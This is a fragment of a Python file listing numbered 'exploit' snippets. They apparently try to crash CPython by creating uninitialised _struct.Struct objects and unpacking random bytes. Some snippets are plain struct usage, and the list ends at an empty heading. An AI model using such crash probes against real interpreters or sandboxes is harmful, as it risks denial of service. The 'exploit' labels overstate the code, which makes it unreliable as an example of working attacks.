from _struct import Struct
s = Struct.__new__(Struct)
s.format = '<I'
s.size = 4
s.unpack(open('/dev/urandom').read(4))

# exploit 3
import _struct
_struct.Struct.__new__(_struct.Struct, '<I').unpack(open('/dev/urandom', 'rb').read(4))

# exploit 4
import _struct
_struct.Struct('<I').unpack_from(open('/dev/urandom', 'rb').read(4))

# exploit 5
import _struct
_struct.Struct('<I').__new__(_struct.Struct, '<I').unpack_from(open('/dev/urandom', 'rb').read(4))

# exploit 6
from _struct import *
Struct.__new__(Struct, 'I').unpack_from(open('/dev/urandom', 'rb').read(4))

# exploit 7
from _struct import Struct
Struct.__new__(Struct, 'I').unpack(open('/dev/urandom', 'rb').read(4))

# exploit 8
